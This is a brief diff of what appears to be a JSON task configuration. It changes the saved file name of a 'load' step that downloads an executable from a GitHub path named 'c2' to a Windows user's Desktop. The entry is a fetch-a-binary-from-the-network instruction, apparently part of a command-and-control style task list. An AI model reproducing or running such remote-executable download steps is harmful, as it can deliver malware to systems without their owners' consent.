@@ -3,7 +3,7 @@
     {
      "type": "load", 
      "url": "https://raw.githubusercontent.com/tvdogs/c2/master/binary32.exe",
-     "dest": "C:\\Users\\SHINDAN1801\\Desktop\\test.exe"
+     "dest": "C:\\Users\\SHINDAN1801\\Desktop\\binary32.exe"
     },
 "00000002": 
     {
